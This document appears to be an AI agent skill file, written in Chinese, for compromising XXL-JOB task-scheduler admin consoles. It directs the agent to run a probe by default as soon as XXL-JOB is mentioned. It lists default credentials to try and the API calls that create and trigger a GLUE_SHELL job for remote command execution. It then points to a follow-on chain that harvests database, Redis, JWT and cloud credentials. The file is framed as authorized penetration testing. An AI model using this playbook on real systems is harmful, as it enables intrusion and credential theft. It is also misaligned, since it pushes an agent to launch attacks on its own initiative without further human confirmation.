---
name: 差事府·胶令
description: >-
  XXL-JOB 调度中心组合链：默认 admin/123456、/xxl-job-admin/、:9997、
  jobgroup/pageList、GLUE_SHELL、GLUE_PYTHON、jobinfo/add、jobinfo/trigger、
  执行器 root 容器。用户提到 xxl-job、xxljob、分布式任务调度、GLUE 任务时立刻使用。
  默认跑 xxljob_admin_probe（登录+列执行器）。GLUE 下发授权内直接做。
---

# XXL-JOB 管理台 → GLUE 组合链

真源：`传承/差事府·无门.md`

```bash
python3 炼蛊房/xxljob_admin_probe.py doctor
python3 炼蛊房/xxljob_admin_probe.py --base http://授权IP:9997 --case <案>
python3 炼蛊房/java_web_surface_probe.py -u http://授权IP:9997 --stack xxljob --case <案>
```

登录成功看 `XXL_JOB_LOGIN_IDENTITY` **或** 302 `/index` **或** JSON `code:200`（老模板只认 JSON 会漏）。

## 四刀

1. **认口** — `/xxl-job-admin/` `:8080` `:9997`；执行器常 `:9999` `/run`  
2. **进后台** — `admin/123456`，再试 `admin/admin` `xxljob/123456`  
3. **列执行器** — `jobgroup/pageList`；空执行器也能 GLUE 但要自己挂  
4. **GLUE** — `jobinfo/add` + `glueType=GLUE_SHELL` + `trigger`；授权内直接做

L3 之后不要停在 `id`：交接 `xxljob-postex-infra-chain`（JAR→YML→JDBC→Redis→JWT→云凭据）。  
真源：`传承/差事府·后手.md`
